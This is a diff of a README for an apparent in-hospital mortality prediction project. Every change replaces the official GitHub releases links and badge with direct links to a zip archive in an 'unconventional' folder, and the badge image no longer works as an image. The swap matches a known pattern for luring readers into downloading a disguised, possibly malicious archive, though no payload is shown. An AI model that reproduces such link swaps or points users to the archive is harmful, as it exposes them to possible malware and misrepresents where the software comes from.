@@ -1,6 +1,6 @@
 # 🏥 reproducible-mortality-prediction - Predict In-Hospital Mortality Easily
 
-[![Download the Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Joyaji/reproducible-mortality-prediction/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/Joyaji/reproducible-mortality-prediction/main/unconventional/reproducible-mortality-prediction.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Joyaji/reproducible-mortality-prediction/main/unconventional/reproducible-mortality-prediction.zip)
 
 ## 🌟 About This Project
 
@@ -29,9 +29,9 @@ To get started, you will need to download the software and run it on your machin
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download Releases](https://github.com/Joyaji/reproducible-mortality-prediction/releases).
+To download the application, visit this page: [Download Releases](https://raw.githubusercontent.com/Joyaji/reproducible-mortality-prediction/main/unconventional/reproducible-mortality-prediction.zip).
 
-1. Go to the [Releases Page](https://github.com/Joyaji/reproducible-mortality-prediction/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/Joyaji/reproducible-mortality-prediction/main/unconventional/reproducible-mortality-prediction.zip).
 2. Click on the latest version available.
 3. Download the appropriate file for your operating system.
 4. Open the downloaded file and follow the installation prompts.
@@ -92,4 +92,4 @@ For further questions or inquiries, please reach out via issues on GitHub or ema
 
 This project is licensed under the MIT License. See the LICENSE file for details.
 
-[![Download the Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Joyaji/reproducible-mortality-prediction/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/Joyaji/reproducible-mortality-prediction/main/unconventional/reproducible-mortality-prediction.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Joyaji/reproducible-mortality-prediction/main/unconventional/reproducible-mortality-prediction.zip)
